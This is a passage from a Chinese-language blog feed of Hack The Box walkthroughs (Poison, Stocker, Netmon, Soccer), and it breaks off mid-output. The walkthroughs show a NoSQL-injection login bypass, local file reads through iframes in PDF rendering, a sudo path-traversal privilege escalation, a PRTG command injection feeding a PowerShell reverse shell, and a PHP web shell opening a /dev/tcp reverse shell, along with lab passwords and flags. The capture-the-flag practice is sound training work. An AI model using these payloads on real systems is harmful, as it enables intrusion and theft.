/var/run/logpriv fffff80003b3a960 dgram 0 0 fffff80003c561d8 0 fffff80003b3a0f0 0 /var/run/log fffff80003b3aa50 seqpac 0 0 fffff80003ae6760 0 0 0 /var/run/devd.seqpacket.pipe 发现开着 VNC 端口 ps -aux root 529 0.0 0.9 23620 8872 v0- I 11:33 0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/ 查看进程，发现 VNC 是由 root 用户运行的 这边是内网的端口，我们无法访问，给他转发出来就可以了 ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84 然后使用 vncviewer 进行连接 ┌──(root㉿kali)-[~/Desktop] └─# vncviewer 127.0.0.1::5901 -passwd secret root@Poison:~ # whoami&amp;&amp;id root uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) 成功提权到 root 权限 root@Poison:~ # cat root.txt 716d04b188419cf2bb99d891272361f5 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Stocker- Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Stocker","date":"2023-01-14T11:38:36.000Z","updated":"2023-06-17T02:28:15.000Z","comments":true,"path":"2023/01/14/Hackthebox/Easy/Hackthebox-Stocker/","link":"","permalink":"http://www.lucifiel.com/2023/01/14/Hackthebox/Easy/Hackthebox-Stocker/","excerpt":"","text":"Hackthebox - Stocker靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.11.196 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-23 05:41 CST Nmap scan report for 10.10.11.196 Host is up (0.38s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 3d12971d86bc161683608f4f06e6d54e (RSA) | 256 7c4d1a7868ce1200df491037f9ad174f (ECDSA) |_ 256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://stocker.htb |_http-server-header: nginx/1.18.0 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=1/23%OT=22%CT=1%CU=32979%PV=Y%DS=2%DC=T%G=Y%TM=63CDADB OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11 OS:NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 554/tcp) HOP RTT ADDRESS 1 274.38 ms 10.10.16.1 2 456.09 ms 10.10.11.196 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 53.20 seconds 这里需要加一个 hosts 解析 echo 10.10.11.196 stocker.htb &gt;&gt; /etc/hosts Http 访问后就是个静态页面，没看到什么可以利用的东西，做一下 fuzz 吧 Fuzz┌──(root㉿kali)-[~/Desktop] └─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://stocker.htb/ --no-error --append-domain =============================================================== Gobuster v3.3 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://stocker.htb/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.3 [+] Timeout: 10s [+] Append Domain: true =============================================================== 2023/01/23 05:53:18 Starting gobuster in VHOST enumeration mode =============================================================== Found: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login] Progress: 114420 / 114442 (99.98%)=============================================================== 2023/01/23 05:56:08 Finished =============================================================== 发现一个虚拟主机，加入 hosts 解析 echo 10.10.11.196 dev.stocker.htb &gt;&gt; /etc/hosts 然后再去访问一下 dev.stocker.htb 是一个登录框 漏洞利用这里是一个基础的 nosql 注入 https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass 修改 Content-Type 内容为 application&#x2F;json 然后使用上面参考文献里的 {&quot;username&quot;: {&quot;$ne&quot;: &quot;foo&quot;}, &quot;password&quot;: {&quot;$ne&quot;: &quot;bar&quot;} } 进行绕过 成功登录，这里是一个购物中心 随便添加一个物品，然后抓个包看看 去看一下提交后得到的订单文件 得到的是一个 pdf 格式的订单，尝试修改一下 Title 的内容呢？ ok，也是可以成功修改的 那么我们提交 iframe 之类的使其渲染时嵌入本地文件呢？ ok，也可行，读取成功 然后就是无限读文件的测试，这里直接跳过，在 /etc/passwd 获得了账号。 接着在 /var/www/dev/index.js 获得了密码 username = angoose password = IHeardPassphrasesArePrettySecure 然后使用 ssh 进行登录 ┌──(root㉿kali)-[~/Desktop] └─# ssh angoose@10.10.11.196 angoose@10.10.11.196&#39;s password: Last login: Sun Jan 22 22:39:59 2023 from 10.10.16.12 angoose@stocker:~$ whoami&amp;&amp;id angoose uid=1001(angoose) gid=1001(angoose) groups=1001(angoose) 成功获得 user 权限 angoose@stocker:~$ ls user.txt angoose@stocker:~$ cat user.txt 6d51a15b13661ffb827c22f4a7662492 成功获得 user 权限的 flag 文件 权限提升angoose@stocker:~$ sudo -l [sudo] password for angoose: Matching Defaults entries for angoose on stocker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User angoose may run the following commands on stocker: (ALL) /usr/bin/node /usr/local/scripts/*.js 可以使用 sudo 权限调用 /usr/bin/node 执行 /usr/local/scripts/ 目录下的所有 js 文件 我们的目的只是要获取 /root/root.txt 文件的内容，那么就可以使用 js read file 来进行利用 const fs = require(&#39;fs&#39;); fs.readFile(&#39;/root/root.txt&#39;, &#39;utf8&#39;, (err, data) =&gt; { if (err) throw err; console.log(data); }); 在当前目录创建一个 js 内容，然后使用目录穿越来进行调用 angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/exp.js 45d08dd713ea28830a34b4186236290e 成功调用并利用我们自己创建的 js 文件，成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Netmon - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Netmon","date":"2023-01-08T11:38:36.000Z","updated":"2023-06-13T03:47:15.000Z","comments":true,"path":"2023/01/08/Hackthebox/Easy/Hackthebox-Netmon/","link":"","permalink":"http://www.lucifiel.com/2023/01/08/Hackthebox/Easy/Hackthebox-Netmon/","excerpt":"","text":"Hackthebox - Netmon靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.10.152 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 04:24 CST Nmap scan report for 10.10.10.152 Host is up (0.49s latency). Not shown: 65522 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-02-19 11:18PM 1024 .rnd | 02-25-19 09:15PM &lt;DIR&gt; inetpub | 07-16-16 08:18AM &lt;DIR&gt; PerfLogs | 02-25-19 09:56PM &lt;DIR&gt; Program Files | 02-02-19 11:28PM &lt;DIR&gt; Program Files (x86) | 02-03-19 07:08AM &lt;DIR&gt; Users |_02-25-19 10:49PM &lt;DIR&gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-server-header: PRTG/18.1.37.13946 |_http-trane-info: Problem with XML parsing of /evox/about 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=1/8%OT=21%CT=1%CU=35681%PV=Y%DS=2%DC=T%G=Y%TM=63B9D584 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A OS:)OPS(O1=M537NW8ST11%O2=M537NW8ST11%O3=M537NW8NNT11%O4=M537NW8ST11%O5=M53 OS:7NW8ST11%O6=M537ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000 OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M537NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+ OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0 OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N OS:%T=80%CD=Z) Network Distance: 2 hops Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -2s | smb2-time: | date: 2023-01-07T20:26:34 |_ start_date: 2023-01-07T20:23:08 | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ Message signing enabled but not required TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 648.51 ms 10.10.16.1 2 397.22 ms 10.10.10.152 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 117.23 seconds 漏洞利用Ftp┌──(root㉿kali)-[~/Desktop] └─# ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; ls 229 Entering Extended Passive Mode (|||49861|) 125 Data connection already open; Transfer starting. 02-02-19 11:18PM 1024 .rnd 02-25-19 09:15PM &lt;DIR&gt; inetpub 07-16-16 08:18AM &lt;DIR&gt; PerfLogs 02-25-19 09:56PM &lt;DIR&gt; Program Files 02-02-19 11:28PM &lt;DIR&gt; Program Files (x86) 02-03-19 07:08AM &lt;DIR&gt; Users 02-25-19 10:49PM &lt;DIR&gt; Windows 226 Transfer complete. ftp 可以使用匿名账户登录，并且还有一些目录文件 ftp&gt; pwd Remote directory: /users/Public ftp&gt; ls 229 Entering Extended Passive Mode (|||49886|) 125 Data connection already open; Transfer starting. 02-03-19 07:05AM &lt;DIR&gt; Documents 07-16-16 08:18AM &lt;DIR&gt; Downloads 07-16-16 08:18AM &lt;DIR&gt; Music 07-16-16 08:18AM &lt;DIR&gt; Pictures 01-07-23 03:23PM 34 user.txt 07-16-16 08:18AM &lt;DIR&gt; Videos 226 Transfer complete. ftp&gt; get user.txt local: user.txt remote: user.txt 229 Entering Extended Passive Mode (|||49887|) 125 Data connection already open; Transfer starting. 100% |**********************************************************************************************************************************************************************| 34 0.05 KiB/s 00:00 ETA 226 Transfer complete. 34 bytes received in 00:00 (0.03 KiB/s) 在目录 /users/public 中找到了 user.txt 文件，并且可以 get 请求到本地 ┌──(root㉿kali)-[~/Desktop] └─# cat user.txt d79ce5330dd16fc989a3fbf6e31f5259 成功拿到 user 权限的 flag 文件 ftp&gt; get license.rtf local: license.rtf remote: license.rtf 229 Entering Extended Passive Mode (|||50056|) 125 Data connection already open; Transfer starting. 100% |**********************************************************************************************************************************************************************| 50098 48.91 KiB/s 00:00 ETAftp: Reading from network: 被中断的系统调用 0% | | -1 0.00 KiB/s --:-- ETA 226 Transfer complete. ftp&gt; pwd Remote directory: /windows/system32 在目录 /windows/system32 下成功下载到了 license.rtf 文件，并且成功从该文件中获取到了系统版本 MICROSOFT WINDOWS SERVER 2016 STANDARD AND DATACENTER 找到了一篇文章 https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data 该文章显示 windows server 2016 的 RPTG 默认安装目录在 programdata 中，去查看一下 ftp&gt; cd programdata 250 CWD command successful. ftp&gt; cd paessler 250 CWD command successful. ftp&gt; ls 229 Entering Extended Passive Mode (|||50169|) 125 Data connection already open; Transfer starting. 01-07-23 03:24PM &lt;DIR&gt; PRTG Network Monitor 226 Transfer complete. 确实存在 ftp&gt; cd &quot;PRTG Network Monitor&quot; 250 CWD command successful. ftp&gt; ls 229 Entering Extended Passive Mode (|||50179|) 150 Opening ASCII mode data connection. 01-07-23 03:24PM &lt;DIR&gt; Configuration Auto-Backups 01-07-23 03:24PM &lt;DIR&gt; Log Database 02-02-19 11:18PM &lt;DIR&gt; Logs (Debug) 02-02-19 11:18PM &lt;DIR&gt; Logs (Sensors) 02-02-19 11:18PM &lt;DIR&gt; Logs (System) 01-07-23 03:24PM &lt;DIR&gt; Logs (Web Server) 01-07-23 03:24PM &lt;DIR&gt; Monitoring Database 02-25-19 09:54PM 1189697 PRTG Configuration.dat 02-25-19 09:54PM 1189697 PRTG Configuration.old 07-14-18 02:13AM 1153755 PRTG Configuration.old.bak 01-07-23 03:24PM 1632703 PRTG Graph Data Cache.dat 02-25-19 10:00PM &lt;DIR&gt; Report PDFs 02-02-19 11:18PM &lt;DIR&gt; System Information Database 02-02-19 11:40PM &lt;DIR&gt; Ticket Database 02-02-19 11:18PM &lt;DIR&gt; ToDo Database ftp&gt; get &quot;PRTG Configuration.old.bak&quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 229 Entering Extended Passive Mode (|||50302|) 125 Data connection already open; Transfer starting. 7% |*********** | 88641 86.52 KiB/s 00:12 ETAftp: Reading from network: 被中断的系统调用 0% | | -1 0.00 KiB/s --:-- ETA 550 The specified network name is no longer available. 获取文件 Configuration.old.bak grep -B5 -A5 -i password RPTG\\ Configuration.dat.bak|sed &#39;s/ //g&#39;|sort -u|less 在该文件中，我们找到了一串疑似密码的玩意儿 &lt;proxyport&gt; PrTg@dmin2018 &lt;retrysnmp&gt; &lt;!--User:prtgadmin--&gt; 但是拿去 web 页面中登录却又失败了 02-25-19 09:54PM 1189697 PRTG Configuration.dat 02-25-19 09:54PM 1189697 PRTG Configuration.old 07-14-18 02:13AM 1153755 PRTG Configuration.old.bak 01-07-23 03:24PM 1632703 PRTG Graph Data Cache.dat 突然想到，这个文件是在 2018 年创建的，那么会不会根据年份变化呢？ username = prtgadmin password = PrTg@dmin2019 去尝试一下 nice，成功登录 权限提升 在找参考文章和漏洞的时候，倒是遇到个小插曲。这里因为我的节点是俄罗斯的，有一些文章直接无法访问，绝了 https://github.com/A1vinSmith/CVE-2018-9276 合理找到了一个命令注入的漏洞以及利用工具 这个原理是 Netmon 在执行通知脚本时，因为没有执行参数检查而导致的命令注入漏洞 点击 `Setup -&gt; Notifications -&gt; Ticket Notification -&gt; Execute Program 这里就是我们利用的地方 但是在利用之前我们要先做点准备 https://github.com/samratashok/nishang 首先使用 nishang 的程序 ┌──(root㉿kali)-[~/Desktop] └─# cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 . 将我们需要的脚本复制到本地 nc -nvlp 4444 使用 nc 监听一个端口 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444 将上面的语句添加到 Invoke-PowerShellTcp.ps1 的最下面 接着将内容转化为 base64 cat Invoke-PowerShellTcp.ps1|iconv -t UTF-16LE|base64 -w0 然后构造一下恶意 poc test|powershell -enc  然后点击右边的小铃铛运行 ┌──(root㉿kali)-[/opt/nishang] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.2] from (UNKNOWN) [10.10.10.152] 51165 Windows PowerShell running as user NETMON$ on NETMON Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\Windows\\system32&gt;whoami nt authority\\system 成功拿到 system 权限 PS C:\\users\\administrator\\desktop&gt; cat root.txt e8d8f9949c60a0501831df4efa8613bc 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Soccer - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Soccer","date":"2022-12-17T11:38:36.000Z","updated":"2023-06-17T02:28:29.000Z","comments":true,"path":"2022/12/17/Hackthebox/Easy/Hackthebox-Soccer/","link":"","permalink":"http://www.lucifiel.com/2022/12/17/Hackthebox/Easy/Hackthebox-Soccer/","excerpt":"","text":"Hackthebox - Soccer靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.194 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 01:38 EST Nmap scan report for 10.10.11.194 Host is up (0.28s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://soccer.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 9091/tcp open xmltec-xmlmail? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: | HTTP/1.1 400 Bad Request | Connection: close | GetRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src &#39;none&#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 139 | Date: Wed, 21 Dec 2022 06:39:07 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&quot;en&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot GET /&lt;/pre&gt; | &lt;/body&gt; | &lt;/html&gt; | HTTPOptions: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src &#39;none&#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Wed, 21 Dec 2022 06:39:07 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&quot;en&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt; | &lt;/body&gt; | &lt;/html&gt; | RTSPRequest: | HTTP/1.1 404 Not Found | Content-Security-Policy: default-src &#39;none&#39; | X-Content-Type-Options: nosniff | Content-Type: text/html; charset=utf-8 | Content-Length: 143 | Date: Wed, 21 Dec 2022 06:39:08 GMT | Connection: close | &lt;!DOCTYPE html&gt; | &lt;html lang=&quot;en&quot;&gt; | &lt;head&gt; | &lt;meta charset=&quot;utf-8&quot;&gt; | &lt;title&gt;Error&lt;/title&gt; | &lt;/head&gt; | &lt;body&gt; | &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt; | &lt;/body&gt; |_ &lt;/html&gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9091-TCP:V=7.93%I=7%D=12/21%Time=63A2AA05%P=x86_64-pc-linux-gnu%r(i SF:nformix,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&quot;)%r(drda,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\ SF:x20close\\r\\n\\r\\n&quot;)%r(GetRequest,168,&quot;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r SF:\\nContent-Security-Policy:\\x20default-src\\x20&#39;none&#39;\\r\\nX-Content-Type-O SF:ptions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nC SF:ontent-Length:\\x20139\\r\\nDate:\\x20Wed,\\x2021\\x20Dec\\x202022\\x2006:39:07 SF:\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lan SF:g=\\&quot;en\\&quot;&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\&quot;utf-8\\&quot;&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt; SF:/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20GET\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;)%r(H SF:TTPOptions,16C,&quot;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Po SF:licy:\\x20default-src\\x20&#39;none&#39;\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\ SF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143 SF:\\r\\nDate:\\x20Wed,\\x2021\\x20Dec\\x202022\\x2006:39:07\\x20GMT\\r\\nConnection SF::\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&quot;en\\&quot;&gt;\\n&lt;head&gt;\\n&lt;m SF:eta\\x20charset=\\&quot;utf-8\\&quot;&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt; SF:Cannot\\x20OPTIONS\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;)%r(RTSPRequest,16C,&quot;H SF:TTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default- SF:src\\x20&#39;none&#39;\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x2 SF:0text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Wed, SF:\\x2021\\x20Dec\\x202022\\x2006:39:08\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\ SF:n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&quot;en\\&quot;&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\&quot; SF:utf-8\\&quot;&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20OPTIONS SF:\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;)%r(RPCCheck,2F,&quot;HTTP/1\\.1\\x20400\\x20Ba SF:d\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(DNSVersionBindReqTCP,2 SF:F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;) SF:%r(DNSStatusRequestTCP,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnec SF:tion:\\x20close\\r\\n\\r\\n&quot;)%r(Help,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\ SF:r\\nConnection:\\x20close\\r\\n\\r\\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP/1\\.1\\x20400\\ SF:x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=12/21%OT=22%CT=1%CU=36450%PV=Y%DS=2%DC=T%G=Y%TM=63A2AA OS:34%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP OS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST OS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F= OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5( OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z% OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C OS:D=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 8080/tcp) HOP RTT ADDRESS 1 279.48 ms 10.10.14.1 2 280.06 ms 10.10.11.194 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.40 seconds Http 80 端口会跳转到域名 soccer.htb，加入 hosts 解析 echo 10.10.11.194 soccer.htb &gt;&gt; /etc/hosts 这是一个足球俱乐部，首页面没有什么有用的东西，先做个信息收集吧 ┌──(root㉿kali)-[~/Desktop] └─# ffuf -u &quot;http://soccer.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://soccer.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 ________________________________________________ [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 278ms] tiny [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 282ms] :: Progress: [30000/30000] :: Job [1/1] :: 141 req/sec :: Duration: [0:03:43] :: Errors: 2 :: 找到个文件夹 是一个登陆页面 漏洞利用搜索到了两个默认密码 username = admin password = admin@123 username = user password = 12345 得到了版本 2.4.3 去找一下漏洞 在网上找到了一个文件上传的 poc，但怎么都无法执行成功 我们去 uploads 文件夹中自己尝试上传试试 &lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.11/4444 0&gt;&amp;1&#39;&quot;) ?&gt; 使用 nc 监听一个端口 nc -nvlp 4444 可以看到已经传上去了，点击 open 打开我们的脚本 ┌──(root㉿kali)-[~/Desktop] └─# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.11] 